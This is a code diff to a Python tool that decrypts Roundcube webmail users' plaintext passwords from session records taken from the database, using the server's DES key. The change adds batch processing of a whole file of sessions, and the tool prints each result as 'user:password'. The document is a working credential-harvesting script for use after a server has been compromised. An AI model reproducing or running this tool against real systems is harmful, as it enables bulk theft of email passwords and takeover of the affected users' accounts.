@@ -11,12 +11,17 @@ def build_args() -> argparse.ArgumentParser :
         description="Decrypt user's password from user's session stored in DB."
     )
 
-    parser.add_argument(
+    session_args = parser.add_mutually_exclusive_group(required=True)
+    session_args.add_argument(
         '--session',
         type=str,
         help="Session stored in roundcube.session table",
-        required=True
     )
+    session_args.add_argument(
+        '--session-file',
+        help="File containing session records, one by line",
+    )
+
     parser.add_argument(
         '--des-key',
         '-k',
@@ -26,6 +31,10 @@ def build_args() -> argparse.ArgumentParser :
     )
 
     return parser
+
+def read_session_from_file(path) -> list[str]:
+    with open(path, 'r') as f:
+        return f.readlines()
 
 def extract_creds(session: str) -> tuple[str, str, str]:
     php_serialized_session = b64decode(session).decode()
@@ -41,8 +50,16 @@ def decrypt_user_session(password, key, iv) -> str:
     decryptor = TripleDESDecryptor(key=key, iv_hex=iv)
     return decryptor.decrypt(secret_hex=password)
 
+def roundcube_session_decrypt(session, key):
+    username, password_hex, iv_hex  = extract_creds(session)
+    print(f"[+] {username}:{decrypt_user_session(password_hex, key, iv_hex)}")
+
 if __name__ == '__main__':
     args = build_args().parse_args()
 
-    username, password_hex, iv_hex  = extract_creds(args.session)
-    print(f"[+] {username}:{decrypt_user_session(password_hex, args.des_key, iv_hex)}")
+    if args.session:
+        roundcube_session_decrypt(args.session, args.des_key)
+    else:
+        sessions = read_session_from_file(args.session_file)
+        for session in sessions:
+            roundcube_session_decrypt(session, args.des_key)
